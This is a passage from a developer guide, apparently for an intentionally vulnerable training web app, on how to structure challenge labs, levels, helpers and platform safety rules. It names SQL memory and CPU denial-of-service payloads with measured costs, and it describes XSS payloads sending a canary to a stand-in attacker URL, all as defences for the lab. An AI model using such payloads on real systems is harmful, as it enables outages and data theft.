# HVWA challenge recipes

How to add a challenge. The worked example is **GK-01 SQLi Login Bypass**
(`src/districts/gatekeeper/gk-01-sqli-login/`): copy its shape, not just its idea.

A challenge is one flag-bearing task, playable at up to four levels. The engine
(`src/core/*`) mounts it, serves its source and diff, issues and checks flags,
and draws the lab bar. The challenge supplies metadata, level code, views and tests.

## 1. Folder pattern

The folder is `<id lowercased>-<slug>` (GK-01 + `sqli-login` = `gk-01-sqli-login`).

```
src/districts/<district>/<id lowercased>-<slug>/
  challenge.ts        metadata + mount(): routes that dispatch to the level module
  model.ts            schema, seed, row types, the level-module interface,
                      lab state (perLevel / perSession) and test seams
  levels/acolyte.ts   one file per implemented level; ONLY these are served
  levels/templar.ts   (View Source shows them verbatim, Diff compares the
  levels/inquisitor.ts lowest exploitable level with divine.ts)
  levels/divine.ts    the secure reference
  views/*.ejs         rendered only through sendPage()
  fixtures/           optional: deliberately binary/malformed lab files
  <id>.spec.ts        the exploit matrix + challenge-specific tests
src/districts/<district>/_shared/   optional: plumbing several labs of the district share
                                    (e.g. gatekeeper/_shared/lab.ts: welcome(), accounts, the admin page)
src/districts/_shared/              plumbing labs of EVERY district share (below): Result, curl, bounded maps, test kits
src/districts/<district>/index.ts   imports each challenge.ts (registration side effect)
src/districts/index.ts              imports each district index
```

- Level files import types from `../model.js`, never from `../challenge.js`. A victim-driven lab may gather its level
  modules (`byLevel`) in `model.ts`, because its citadel handler needs them (section 8); its level files then import
  ONLY types from `model.ts` (a runtime import would be an ESM cycle), and take shared values from `_shared/` or local
  constants.
- **A victim-driven lab may keep its page functions and its citadel handler in `model.ts`** (GK-10, GK-11, GK-16): the
  functions both browsers' requests go through (`startLogin`, `authorize`, `callback`, `portalSignIn` ..., each taking a
  `Visit` and answering a `Reply`, section 8) and `citadel(level, state, r)` live next to the lab state and `byLevel`,
  and `challenge.ts` keeps the metadata, the victim actions and the real routes. They are plumbing: every decision the
  lesson is about is a call into `impl.for(level)`, so the flaw stays in `levels/*.ts`.
- Everything the vulnerability needs lives in the level file, so View Source
  and the Diff tell the whole story. `challenge.ts` and `model.ts` are plumbing.
  **One deliberate exception: error verbosity.** `tryDb` in `challenge.ts`
  decides it (the real message below Divine, a generic one at Divine), so say so
  in `divine.ts`'s comment, where Diff readers will see it.
- Shared plumbing goes in `_shared/`; the flaw itself (limiter, lockout, token generator) never does:
  it stays in the level files so View Source and the Diff show it.
- **District shells, per lab shape.** Labs of one shape (login, JWT, ...) share a shell in
  `_shared/<shape>-lab.ts`: the routes, cookie, vault and other plumbing, driven by callbacks
  (`issue`, `verify`, `blurb`, `links`). Shared views live in `_shared/views/`. A shell never holds policy:
  every verification rule, filter or limiter stays in the lab's own `levels/*.ts`, and lab-specific routes
  (a published key, a wordlist) stay in its `challenge.ts`. Worked example: `gatekeeper/_shared/jwt-lab.ts`
  (`mountJwtPortal`) used by GK-04 to GK-07. Keep the lab seams uniform across the shape
  (e.g. `issueToken(req, claims)`, `mintToken(sessionId, level, claims)`).
- **Test kits.** Tests every lab of a shape repeats live once in `_shared/<shape>-lab.testkit.ts` (suffix
  `.testkit.ts`, never `.spec.ts`: a spec would be collected on its own and registered once per importer).
  Vitest collects only `*.spec.ts`; `tsconfig.json` excludes `src/**/*.testkit.ts`, so test code never reaches
  `dist/`, while `tsconfig.test.json` still type-checks it (`tests/tooling.spec.ts` asserts all three). A lab's
  spec calls the kit's `describe...` function. Worked example: `gatekeeper/_shared/jwt-lab.testkit.ts`
  (`describeJwtLabBasics`).
- **Plumbing for every district: `src/districts/_shared/`.** A district never imports another district's `_shared/`;
  what two districts need lives here. Like any `_shared/`, it never holds a flaw.
  - `result.ts`: `Result` (`{ ok, text }`), the lab message a view shows as `lab-message lab-success|lab-error`.
  - `curl.ts`: `curlFor(req, res, { path, method?, headers?, cookies?, data?, form?, files?, signIn? })` → `CurlView`, `shellQuote(text)`,
    with the partial `views/curl-note.ejs`: a curl line that can work. It carries the full quoted URL, `-X <method>`
    (PUT, PATCH ...), the headers it needs, `-d '<json>'` and/or `--data-urlencode 'name=value'` (values are
    shell-quoted), and `-b "hvwa_sid=<copy from devtools>"`. With `files: [{ field, filename, sendAs?, type? }]` the example is multipart: `-F 'field=@filename;filename=sendAs;type=type'` per file, then each `form` field as `-F 'name=value'` (files and fields in the order given; `CurlView.multipart`), after the `-b` cookie. Scriptorium's `uploadCurl` is this call. Never print the sid: a lab belongs to the browser session,
    so curl without that cookie plays in another session whose flags `/api/submit` from the browser would reject. The
    partial also says the line is bash syntax and that Windows PowerShell needs `curl.exe` (plain `curl` there is
    `Invoke-WebRequest`). A lab view at `src/districts/<district>/<lab>/views/` (or `<district>/_shared/views/`)
    includes it with `<%- include('../../../_shared/views/curl-note', { curl: curl }) %>`. The note tells the player to
    sign in first; a lab nobody signs in to (the Relic Market shops, whose customer is already signed in) passes
    `signIn: false`, and the note says to open the page instead.
  - `collections.ts`: bounded maps and ids for lab state (section 4, "Bound every map"): `newId()` (16 CSPRNG bytes,
    32 hex), `putBounded(map, key, value, max, keep?)` (store newest last; beyond `max` the oldest key `keep` does not
    pin goes) and `trimBounded(map, { max, pin?, spare? })` for a lab that inserts elsewhere and trims later (`pin`:
    never evicted, e.g. the admin's session; `spare`: evicted only when nothing else can go, e.g. signed-in sessions
    after anonymous ones). Each lab states its own rule: GK-10/11 pin the admin's session, GK-16 spares signed-in ones.
  - `sql.ts`: `firstRows(stmt, max, ...params)` (at most `max` rows read with `iterate()` and stopped there: the result cap of
    rule (g); a SQL `LIMIT` is no cap) and `cell(v, n = 200)` (a result cell as display text; core `clip` is the copying clip
    for stored text). Relic Market's `_shared/sql.ts` re-exports them (`cell` as `clip`).
  - `url.ts`: `withParams(uri, params)`: `uri` with `params` appended to its query, as an authorization server
    appends a code (the uri otherwise left as given, a fragment kept last). Build such URLs with it, never by
    concatenating `${uri}?code=` (that breaks a uri that already has a query or a fragment).
  - `curl.testkit.ts`: `describeCurlExample({ challenge, path, curl: (level) => ExpectedCurl })`, the front page's curl
    line at every level. `curl.spec.ts` tests the helpers and the partial.
  - `victim-lab.testkit.ts`: the victim-lab test kit (section 8, Testing).
  - `xss-lab.ts` + `views/xss-proof.ejs`: what the server-sink XSS labs share (SC-01, SC-02, SC-04, FP-05; section 13):
    `xssVictim(cookie, handler)` (in the `perSession` factory: a world, the player's marker, the admin's session key and
    XSS browser, signed in), `rearmVictim(cookie, victimFor)` (the presets' `rearm`), `signOutPage(cookie)` (the
    citadel's `/logout`), `keySignIn(req, challenge, typed, victim, who)` (the proof: the whole key below Divine shows
    the flag) and `proofView(...)` for the partial (the marker in `<code data-marker>` and the sign-in form,
    `intent=sign-in`), included with `<%- include('../../../_shared/views/xss-proof', { proof: proof }) %>`.
  - `xss-lab.testkit.ts`: `describeXssLab({ challenge, path, victimOf, attack, preview, fragment, payloads,
    divineSanitizes? })` (section 13, Testing), `xssExploit(path, attack)` (an exploit as the player plays it), and the
    page readers `markerOn`, `stealsOn`, `stolenKey`, `previewSrcdoc`, `signIn`, `labPage`.
- **The Relic Market shop shell** (`relic-market/_shared/`: money, cart, orders, intents, the shop page, its test kit)
  is section 10; its race and time primitives are sections 11 and 12.
- **Shared pieces of the pilgrim labs** (sign in as `pilgrim`, take over the admin's data or page: GK-12 ... GK-18),
  all in `gatekeeper/_shared/`:
  - `pilgrimLogin(req)` + the `views/pilgrim-form.ejs` partial: the sign-in check, form and message.
  - `accountOf(username, password, adminPassword)` (the admin with this lab's password, pilgrim/pilgrim, or undefined)
    and `roleOf(username)` (for `welcome()`), shared by labs with their own sign-in (GK-10, GK-11).
  - `curlFor`, `shellQuote` and `Result` are re-exported from `gatekeeper/_shared/lab.ts`, so Gatekeeper code imports
    them from there; they live in `src/districts/_shared/` (above).
  - `sendAdminPage(res, { admin, granted, denial, flag?, pre?, denyStatus? })` + `views/admin.ejs`: the admin page.
    **A denial is 403 by default**; pass `denyStatus` only with a reason. (GK-17 passes `denyStatus: 200`: that is a
    Batch A exception from before the default existed. Do not copy it.) Pass `flag: { req, challenge }` and the page
    appends the flag line itself, only when `admin` is true, and Divine's rule is built in: "Welcome back." instead of
    a flag, whatever the lab passes. `flagLine(req, challenge)` is the same line for a lab that builds its own page.
    (It stays in Gatekeeper: "Welcome back." at Divine is this admin page's wording, not every district's.)
    The lab's real access check still lives in `levels/*.ts`.
  - The test kit `pilgrim-lab.testkit.ts`: `describePilgrimLab`, `newCtx`, `pilgrimClient`, and `describeCurlExample`
    (re-exported from `src/districts/_shared/curl.testkit.ts`).
  Views include the Gatekeeper partials with `<%- include('../../_shared/views/pilgrim-form', { ... }) %>` and the curl
  partial with `<%- include('../../../_shared/views/curl-note', { curl: curl }) %>`.
- **Pilgrim-ID, the identity provider of the OAuth labs** (GK-10, GK-11), in `gatekeeper/_shared/oauth.ts`: besides
  `CLIENT_ID`, `CODE_TTL_MS`, `newVerifier()`, `s256()`, `IssuedCode`, `Exchange` and `withParams()` (re-exported
  from `src/districts/_shared/url.ts`), its sign-in and
  `/idp/authorize` are shared as a shell driven by callbacks, like `mountJwtPortal`: a lab declares
  `const PILGRIM_ID: PilgrimId<LabState> = { cookie, adminPassword, pinnedSession?, maxEntries, policy }` and calls
  `pilgrimIdSignIn(PILGRIM_ID, v, state, username, password)`, `pilgrimIdAuthorize(PILGRIM_ID, v, state)` and
  `pilgrimIdUser(PILGRIM_ID, v, state)`. The lab state holds `idpSessions`, `codes` and `world` (`PilgrimIdState`).
  `policy(level)` returns the `PilgrimIdPolicy` (`allowRedirect(uri)`, `checkPkce(challenge, method)`): GK-10 passes
  `(level) => impl.for(level)`, so its flaw stays in `levels/*.ts`; GK-11, whose Pilgrim-ID is sound, passes its fixed
  rules.
- `fixtures/`: any path segment named `fixtures` is exempt from the repo
  hygiene scan (UTF-8, no control characters). Non-`.ts` files there are copied
  into `dist/` by `copy-assets`.

## 2. The four levels

| Level | Means | Example (GK-01) |
|---|---|---|
| **Acolyte** | No defense | both fields concatenated into SQL |
| **Templar** | Naive filter / blacklist | quotes stripped from the username only |
| **Inquisitor** | Real defense, subtly flawed | parameterized, but the password is compared with `LIKE` |
| **Divine** | Correct for the weakness under study; other gaps noted in a comment | parameterized, exact comparison, generic errors; the comment notes that hashing and rate limiting are out of scope; never issues a flag |

Each exploitable level needs its own exploit, and each level is a step up: the
exploit for a level must fail at the next implemented level above it (matrix
case (g)). Divine resists every exploit.

## 3. Engine helpers

| Helper | From | Use |
|---|---|---|
| `defineChallenge(input)` | `core/registry` | validate metadata, default `points` (100) and `check` (level-bound flag) |
| `register(c)` | `core/registry` | add to the registry (rejects duplicate id or route), deep-freeze |
| `challengeDir(import.meta.url)` | `core/source` | the `dir` field: the folder holding `levels/` |
| `byLevel<M>({ acolyte, templar, inquisitor, divine })` | `core/lab` | gather the level modules against one interface `M`; `.levels` (rank order) goes to `defineChallenge`, `.for(req.level)` picks the module. Omit levels you do not implement |
| `perLevel(factory)` | `core/lab` | one lazily created instance per level, shared by all players: `.for(level)` |
| `perSession(factory, { maxEntries?, idleTtlMs? })` | `core/lab` | one lazily created instance per (session, level) via `factory(level, sessionId)`: `.for(req)` |
| `perSession(...).reset(req)` | `core/lab` | drop that (session, level)'s instance (calls `dispose`): the body of a lab's `reset` hook |
| `labPath(res)` | `core/lab` | the canonical lab path `/d/<district>/<slug>`, set by the engine as `res.locals.labPath` (also readable in views as `labPath`); use it for every lab link and cookie path |
| `header(req, name)` | `core/lab` | a request header as a string (`undefined` if missing or repeated); client-written, never an identity |
| `fixtureLines(url)` / `sendLines(res, lines)` | `core/fixtures` | a lab's fixture list read once (`new URL('./fixtures/x.txt', import.meta.url)`) and served from a lab route as `text/plain` |
| `challengeDb(schema, seed?)` | `core/challenge-db` | private in-memory SQLite, `prepare()`-only facade; `randomblob()`/`zeroblob()` capped at `CHALLENGE_BLOB_CAP` (64 KiB, section 4) |
| `tryDb(req, () => call(), label?)` | `core/lab` | `{ ok: true, value }` or `{ ok: false, message }`: `<label>: <msg>` below Divine (label defaults to `Database error`), `Invalid request.` at Divine. Synchronous only: a Promise result throws |
| `field(req, name)` | `core/lab` | a body field as a string, `''` for missing or non-string values |
| `flagFor(req, challenge)` | `core/mount` | this session's flag at the served level; throws at Divine |
| `sendPage(res, viewFile, data)` | `core/render` | the only way to render (absolute `.ejs` path) |
| `declareLabWeight(bytes, what?)` | `core/lab` | in a victim-driven (or upload) lab's `perSession` factory: what the lab's own bounded maps hold at worst, weighed in the shared byte budget (section 8) |
| `simWorld({ mailboxes })`, `world.browser(handler)` | `core/sim` | victim-driven labs: one player's inbox, attacker log and the victim's browser, made inside the lab's `perSession` factory (section 8) |
| `defineChallenge({ victim: { sim, actions } })`, `VICTIM_LABELS` | `core/registry`, `core/sim` | the victim's buttons (`POST <lab>/victim/<name>`, 303 back) and the inbox / attacker-log panel under every lab page (section 8) |
| `classifySimUrl(url, base?)`, `labHref(u, base, level)` | `core/sim` | where a URL really takes the victim's browser (`citadel` / `attacker` / `other`); a citadel URL as a link into the lab (section 8) |
| `checkMailAction({ browser, mailbox, link?, rearm })`, `sendLinkAction(browserFor, { rearm })` | `core/sim` | the two usual victim actions, with a required re-arm step at the start of each (section 8) |
| `browser.crossSiteLink(url, { page? })`, `.crossSitePost(url, form, { contentType?, page? })`, `.corsFetch(url, { method?, credentials?, headers?, body?, page? })`, `.frame(url, { page? })`, `.clickThrough(frame, action, form)` | `core/sim` | what the player's attacker page makes the victim's browser do across sites: SameSite, Origin, Sec-Fetch, CORS and framing as Chrome applies them (section 8, "Across sites") |
| `visitAttackerPageAction({ browser, page, rearm })`, `sendAttackerPageAction({ browser, page, rearm })`, `frameAndClickAction({ browser, click, rearm, page? })`, `ATTACKER_EXFIL_URL` | `core/sim` | the cross-site victim actions: the admin opens your page (CSRF, CORS) or your framing page (clickjacking), with a required re-arm (section 8, "Across sites") |
| `sendSimRedirect(res, location, status?)` | `core/sim` | a real route answering a level's redirect: a citadel URL goes to the same place in the lab, anything else gets a "your browser would go to ..." page, never a real redirect off the lab (section 8) |
| `Reply`, `toSim(reply)`, `sendReply(res, reply, render)`, `cookiePath(base)`, `TwinCookie` | `core/sim` (`core/twin.ts`) | one page answer for both browsers: a `SimResponse` for the citadel handler, the real route's answer (cookies with their attributes, redirects through `sendSimRedirect`, a forward as a note) (section 8) |
| `visitOf(req, res, cookieNames, headerNames?)`, `simVisitOf(level, r, cookieNames?, headerNames?)`, `Visit`, `RequestVisit` | `core/sim` (`core/twin.ts`) | what a page function needs from either browser's request: level, raw query, the lab's own cookies, `base`; and (RequestVisit) its method, headers, body, text and `self`, the lab's own origin (section 8) |
| `twinBody()` | `core/sim` (`core/twin.ts`) | route-local `express.text` (text/plain, 8 KiB) for a state-changing route whose levels read a text/plain body (section 8) |
| `REDIRECT_STATUSES` | `core/sim` | the statuses a browser follows a `Location` on (301, 302, 303, 307, 308) |
| `parseMultipart(req, limits?)`, `settle(p)`, `UPLOAD_LIMITS`, `UploadError` | `core/upload` | upload labs: the raw multipart body `express.raw` read on the upload route, parsed and capped; `tryDb(req, await settle(parseMultipart(req)), 'Upload error')` (section 9) |
| `looksLikeImage(bytes)`, `sniffImage(bytes)`, `placeholderImage(sniff)` | `core/upload` | PNG/JPEG/GIF/WebP magic bytes and size, from the header ONLY (SC-09's polyglot lesson; never a safety check); the constant-size GIF a safe level serves instead (section 9) |
| `readZip(bytes, limits?)`, `ZIP_LIMITS` | `core/upload-zip` | an archive's entries (names exactly as written, bytes), with a zip-bomb guard; synchronous, inside `tryDb` (section 9) |
| `simFs(opts?)`, `resolveSimPath(path, separators?)`, `SIMFS_LIMITS` | `core/simfs` | one player's simulated file system per level, made in the `perSession` factory; paths resolved by the simulated OS's rules (section 9) |
| `simInterpret(bytes, canary)` | `core/simfs` | the "webshell": nothing executes; prints the canary if the file holds `<?hvwa CANARY ?>` (section 9) |
| `newMarker()`, `xssBrowser(world, handler, { marker, canary, interact?, dom? })`, `XSS_STEAL_URL` | `core/xss` (`core/victim.ts`) | XSS labs: the player's marker call per player and level, and the admin's browser whose rendered pages run through the oracle; a payload that runs sends `GET http://attacker.test/steal?c=<canary>` to the attacker log (section 13) |
| `previewFrame(fragment, { marker?, title?, hash? })` | `core/xss` | the vulnerable fragment, live for the player, inside `<iframe sandbox="allow-scripts" srcdoc>`; the only raw output of an XSS view (section 13) |
| `xssOracle(html, marker, opts?)`, `linkSinks(html)`, `roundTrip(html)`, `XSS_LIMITS` | `core/xss` | the static oracle itself (sinks, marker, mXSS), the links and resources a mail would load, a sanitizer's fixed-point seam, the bounds (section 13) |
| `rendersDocument(headers)`, `DOCUMENT_MIME_TYPES` | `core/xss` (`core/victim.ts`, `core/xss/rules.ts`) | whether a browser renders an answer with these headers as an HTML or XML document, or not at all (another type, an attachment): the rule `xssBrowser` judges by, for a lab page that tells the player how the victim reads an answer (SC-05) |
| `setLabHeaders(res, { csp?, frameAncestors?, xfo?, cors? })`, `labHeaders(h)`, `LabHeaders` | `core/http` | a level's CSP / `X-Frame-Options` / `frame-ancestors` / CORS on its OWN route's response, from an allow-list; `labHeaders` is the same lines as a plain object, for a citadel twin's `SimResponse` (section 4, "Lab headers") |

`req.level` on a challenge route is already clamped to the implemented levels;
`req.sessionId` and `req.lang` are typed. `res.locals.challenge` and
`res.locals.level` feed the layout's lab bar.

### GK-01, condensed

```ts
// model.ts
export interface LoginLevel {
  findUser(db: ChallengeDb, username: string, password: string): UserRow | undefined;
}
const users = perLevel(() => {
  const adminPassword = randomBytes(16).toString('hex');
  const db = challengeDb(SCHEMA, (raw) => { /* seed citadel_admin + pilgrim */ });
  return { db, adminPassword };
});
export const usersDb = (level: Level) => users.for(level).db;
export const adminPassword = (level: Level) => users.for(level).adminPassword; // test seam

// challenge.ts
const impl = byLevel<LoginLevel>({ acolyte, templar, inquisitor, divine });
export const GK01 = register(defineChallenge({
  id: 'GK-01', district: 'gatekeeper', slug: 'sqli-login', dir: challengeDir(import.meta.url),
  levels: impl.levels, /* title, summary, maps, hints */
  mount: (router) => {
    router.get('/', (_req, res) => sendPage(res, view, { account: PLAYER, result: null, username: '', password: '' }));
    router.post('/', async (req, res) => {
      const username = field(req, 'username');
      const password = field(req, 'password');
      const db = usersDb(req.level);
      const level = impl.for(req.level);
      const found = tryDb(req, () => level.findUser(db, username, password)); // DB call only
      // ... flagFor(req, GK01) only for an admin row below Divine, OUTSIDE tryDb
      await sendPage(res, view, { account: PLAYER, result, username, password });
    });
  },
}));
```

For a shape with a shell, a lab's `challenge.ts` shrinks to metadata, the shell call
(`mountJwtPortal(router, { challenge, blurb, issue, verify, ... })`) and its own routes; see section 1.

## 4. Platform rules

**(a) Render only with `page()` / `sendPage()`** from `core/render.ts`, never
`res.render()` or a two-argument `ejs.renderFile` with request data (EJS option
injection would reach the host process). View data may not use the reserved
keys: `escapeFn include rethrow __append __output locals body t lang challenge level labBar labPath simPanel title`. `title` is reserved because the
layout's `<title>` was once clobbered by a lab view's own `title` (use `heading`); the layout reads the platform-only
`pageTitle` (the portal sets it), else `labBar.pageTitle`, else the app name.

**(b) The vulnerability lives only in the challenge's own surface**: its level
files, its `challengeDb`, its simulated sandbox. Never in shared platform code.
The platform and Divine stay secure.

**(c) A custom `check()`** follows the contract in `registry.ts`: true only for
the level the submission proves, side-effect free, no platform DB.

**(d) Read the level from `req.level`.** Divine never issues a flag (`flagFor`
throws there). Call `flagFor` outside `tryDb`, so an engine error reaches the
stack-free error handler instead of being shown as a "database error".

**(e) Attacker input reaches a challenge DB only through `challengeDb`'s
`prepare()`**, never a raw `exec()`. The seed callback may use the raw handle.

**(f) Labs whose exploit mutates state** (lockout counters, OTPs, balances,
roles, coupons, stored XSS, memory poisoning...) keep that state in
`perSession()`, so one player's exploit never changes another player's lab.

**(g) Never rely on genuinely slow SQL.** `node:sqlite` is synchronous with no
query timeout: a heavy injected query blocks the whole server. Time-based labs
evaluate the injected condition, then `await` a simulated delay. Labs that run
fully attacker-chosen SQL must also cap result size.

**SQL memory bombs.** `node:sqlite` (Node 22) has no `sqlite3_limit()`, so SQLite's own `randomblob(n)` and
`zeroblob(n)` make blobs of up to 1 GB in one call: one injected `randomblob(900000000)` allocates 900 MB, and the app
container has 512 MB. `challengeDb` therefore registers capped overrides of both on EVERY challenge DB, before the schema
and seed run (an application-defined function takes precedence over the built-in): they return at most
`CHALLENGE_BLOB_CAP` (64 KiB) and behave like the built-ins below it. Labs need do nothing, must not depend on bigger
blobs, and a seed must never re-register either function uncapped. **What the cap does and does not do:** it removes
the textbook payload (`randomblob(900000000)`) and the heavy-query timing trick built on it (a big `randomblob` as a
delay in blind SQLi). It does NOT make a single injected call memory-safe in general. Measured on Node 22.22 / SQLite
3.50.4, each of these is ONE statement: `printf('%0900000000d', 1)` adds about 1.7 GB, `replace(hex(zeroblob(65536)),
'0', hex(zeroblob(4000)))` about 1 GB (one `replace()` call), and `group_concat` over a 4000-row recursive CTE about
1 GB. `PRAGMA hard_heap_limit` does nothing in Node's bundled SQLite (and `prepare()` refuses PRAGMA anyway). These
remain an **accepted self-DoS gap of a loopback, single-player lab**: the only player who can send them stops their
own app (restart the container), so they are documented, not mitigated. Rule (g) still applies on top: a lab that runs
fully attacker-chosen SQL caps what it returns (rows read, text shown).

**CPU: a cross join is a time bomb too (accepted residual gap).** Capping what a query RETURNS does not cap what it
COMPUTES, and the engine has no query timeout. A lab whose injected SQL can name a table of its own several times
(`FROM activity,activity,activity,activity`, 61 characters) pays the PRODUCT of the row counts in blocked event loop:
FP-10 with 106 activity rows took 5.3 s here (12.7 s on the reviewer's machine) for one request, and a 5-way join of the same
tables is longer still. The mitigation is the same as for memory: keep the tables the player can fill SMALL and bound their
rows (FP-10 trims members and activity to 30 registrations each: about 0.2 s worst case with four tables), and bound the
attacker's text (a 64-character name limit leaves room for at most four such joins). What remains is an **accepted
residual CPU gap of a loopback, single-player lab**, the same as the memory gap above: the only player who can send such a
query stalls their own app for a moment. A lab that lets the player send SQL longer than a short name should measure the
worst cross join of its own tables and put the number next to its caps. In particular `firstRows` bounds the rows
RETURNED, not the rows computed: an `ORDER BY` (RM-01) materialises and sorts the whole result before the first row comes
back, so the 50-row cap does not bound that work, and it is part of the same accepted residual CPU gap.

**Lab state: `perLevel` or `perSession`.** Never a bare module-level
`challengeDb` for a lab that holds a secret or state.

- `perLevel(factory)`: read-only labs whose data the exploit only reads, but
  where a secret (password, token, signing key, coupon code) must not cross
  levels. One instance per level, shared by every player. In GK-01 an admin
  password dumped by Acolyte SQLi earns the Acolyte flag (a legitimate attack
  path) but logs in nowhere else.
- `perSession(factory, { maxEntries, idleTtlMs })`: anything an exploit (or
  normal play) mutates. One instance per (session, level), so it already
  isolates levels: do not wrap it in `perLevel`. Memory is bounded: least
  recently used instances beyond `maxEntries` (default 5000) are evicted, and
  instances idle longer than `idleTtlMs` (default 26 h) are dropped. A dropped
  lab is rebuilt fresh on the next request, so labs must tolerate a reset.
  An optional `dispose(value)` runs when an instance is evicted or expires (to
  release a resource; its errors are swallowed). The bound is per `perSession`
  holder, so the worst case is `maxEntries` x the number of stateful labs: fine
  for a loopback single-player lab. Holders that keep simulated-victim state share one smaller, process-wide
  budget instead (section 8).
  **Eviction and TTL expiry are a reset** (counters, locks and secrets are rebuilt), so a lab with limiters must
  survive neither: (a) `idleTtlMs` must exceed the longest lock or lockout the lab uses (the default 26 h is
  longer than the 24 h cap of the Divine escalating locks; never lower it for such a lab); (b) creating
  instances is rate limited so an eviction flood is impractical: each holder allows `maxNewPerMinute` (default
  120) new instances a minute (`NewSessionLimitError`, HTTP 429, nothing evicted), and the app issues at most 60 new
  `hvwa_sid` a minute (`createApp({ maxNewSessionsPerMinute, sessionClock })`, 429 "Too many new sessions").
  With 5000 entries a flood needs about 42 minutes at the default rate. Holders live at module level, so every app in a spec file shares them and fresh apps do NOT reset the limit. Tests
  therefore run with the per-holder default lifted to `Infinity` (`setPerSessionDefaults` in `src/core/lab.ts`, called
  from `tests/support/setup.ts`); a holder with an explicit `maxNewPerMinute` keeps it, so a limit test must pass it
  (or set the default itself). Any per-session store (an inbox, an attacker log, ...) must go through `perSession` so it
  inherits these limits; never keep your own Map keyed by session id.

**Restart lab (rare).** A lab whose state can get *stuck* (a hijacked or poisoned session, stored-XSS cleanup, a
wedged workflow) may pass `reset: (req) => holder.reset(req)` to `defineChallenge`. The engine then mounts
`POST <lab>/_reset?level=<level>` (calls the hook, answers 303 back to the lab) and the lab bar shows a
"Restart lab" button. Reset only the served level. The route has a per-(session, level) cooldown
(`resetCooldownMs`, default 10 s, answers 429 while cooling; tests inject `createApp({ resetClock })`), a safety net
and not a licence for the rules below.

**Restart must never refill a budget.** It must not refill an attempt budget, clear a lockout or limiter, or
re-roll a guessable secret while clearing counters: "reset, guess 5 times, repeat" would beat every level without
its designed flaw (the session survives a restart, so flags stay earnable). Therefore **labs with limiters,
lockouts, OTP counters or attempt budgets must not define `reset`**: their state must heal on its own (locks expire,
a sign-in issues a new code). Say it in the spec: `POST <lab>/_reset` is 404, and N failures + a reset attempt +
the real secret is still refused with no flag (GK-02, GK-03, GK-15). GK-17 keeps Restart because it touches no limiter.

**Every lab answers `GET /` at every implemented level** with 200, rendered
with `sendPage` (so it has the lab bar); the `labs.spec.ts` smoke test and
`verify:dist` request it, each through one cookie jar like a browser (section 6). **API-only labs** (the Archive API district) still
serve an HTML landing page at `GET /` describing their endpoints (method, path,
an example request), and mount the API itself on sub-paths.

**Errors.** Wrap only the DB or parser call in `tryDb`. Below Divine the real
message is shown on purpose (error-based learning, CWE-209); Divine shows a
generic message. Parser labs (XXE, YAML) pass a label:
`tryDb(req, () => parse(xml), 'Parser error')`. `fn` must be synchronous
(`node:sqlite` is); `tryDb` throws if it returns a Promise. Read body fields
with `field()`, so a JSON object or extended-urlencoded nesting is an empty
string, not a 500. **One exception: blind labs** (RM-02, RM-03) show no database text at ANY level, because an echoed
error would make them error-based; a database error is rendered as the level's ordinary negative answer, `divine.ts`
says so, and the spec uses `malformed: []` plus an explicit "no database text at any level" case (section 12).

**Lab links and cookies.**

- **Links are absolute, built from `labPath`.** Never a relative `href` (`wordlist.txt` on
  `/d/gatekeeper/brute-force` resolves to `/d/gatekeeper/wordlist.txt`), and never `req.baseUrl`: it echoes the
  request's spelling (`/D/GATEKEEPER/...`), which gives wrong links and cookie paths. Pass `base: labPath(res)`
  to the view and include `?level=<level>` where the target is level-specific.
- **Lab cookies:** `Path` = `labPath(res)` (browsers match cookie paths case-sensitively); a distinct name per
  level (levels share the path and must not overwrite each other: `citadel_sid_<level>`); choose `httpOnly`
  deliberately (a session id: yes, and say in the view how to edit it, devtools storage or `curl -b`; a
  deliberately client-writable counter: no); never a name starting with `hvwa_` (the platform's). A victim-driven lab
  sets them through its `Reply` (`TwinCookie`: `httpOnly` and `sameSite` default to HttpOnly and Lax, section 8).
  Tests: `describeLabCookies` (`victim-lab.testkit.ts`) checks the name per level, the canonical path and HttpOnly.
- **The platform's cookies are off limits:** `hvwa_sid` (the anonymous session every lab is keyed by), `hvwa_level`,
  `hvwa_lang` and `hvwa_auth` (the platform login's token, src/auth; HttpOnly, SameSite=Lax, Path=/). A lab never
  reads, echoes, sets or clears any of them; lab state belongs to `hvwa_sid` (via `perSession`), never to the login.
  With the login on (the Docker image), every lab route sits behind it: a lab test that needs that runs with
  `createApp({ auth: true })`; every other spec runs with the login off (`tests/support/setup.ts`).
- **A request without the lab's cookie must not change lab state.** Probing a page (an admin page, a wrong guess)
  must not mint sessions, advance generators or push activity entries; only the pages the player uses to get a
  session do. Pin entries the lab depends on (the admin's session, the admin's activity line) so trimming a list
  never drops them.
- **Bound every map keyed by attacker input** (header values, usernames, spellings): cap its size, hash long keys
  (`> 64` chars), and track only real accounts where the design allows it. A cap that evicts must not let the
  attacker flush a counter they care about (made-up names must not push the admin's counter out). Use the helpers in
  `src/districts/_shared/collections.ts` (section 1) rather than a hand-written loop: `putBounded(map, key, value, max,
  keep?)`, or `trimBounded(map, { max, pin?, spare? })` where entries are added elsewhere (a level file) and trimmed
  after; `pin` what the lab depends on, `spare` what should go last. A bound that is platform safety, not the lesson,
  belongs in `model.ts`.
- **Fixtures** (wordlists, leaked lists) live in `fixtures/`, are read once with `fixtureLines` and served with
  `sendLines`; the page links them by absolute path.

**Lab headers (route-scoped, `core/http.ts`; owner decision Q4).** On lab routes the platform sends no CSP, no
`X-Frame-Options` and no CORS headers, and no lab changes that globally: a lab that needs them (an XSS Divine's CSP, the
clickjacking and CORS labs' per-level framing and CORS answers) sets them on its OWN response with `setLabHeaders(res, h)`.
Nothing else changes: not the lab's other routes, not another lab, not the portal, not the platform's own pages
(`tests/http.spec.ts`). The platform's own pages carry only their own framing rule, never a lab's: portal pages
`frame-ancestors 'self'` (`src/portal/frame-policy.ts`, skipped for every `/d/` path), the login pages `'none'`.

```ts
// levels/divine.ts: the level decides, so View Source and the Diff show it
export const headers: LabHeaders = { csp: "script-src 'self'; object-src 'none'; base-uri 'none'" };
// challenge.ts (real route) and model.ts (citadel twin): one decision, both browsers
setLabHeaders(res, impl.for(req.level).headers ?? {});
return { status: 200, headers: labHeaders(impl.for(level).headers ?? {}), body };
```

- **The allow-list** is the whole interface: `csp` (one policy, no comma), `frameAncestors` (its source list, written as
  that policy's own `frame-ancestors` directive), `xfo` (`'DENY'` or `'SAMEORIGIN'`), and `cors: { allowOrigin?,
  allowCredentials?, varyOrigin? }` (`Access-Control-Allow-Origin` as the level decided it, a reflected or `null` origin
  included; `Access-Control-Allow-Credentials: true` only for `true`; `Vary: Origin` added to any `Vary` already set).
  Any other option, a value of the wrong type or with a control character, or `frame-ancestors` given twice throws: a
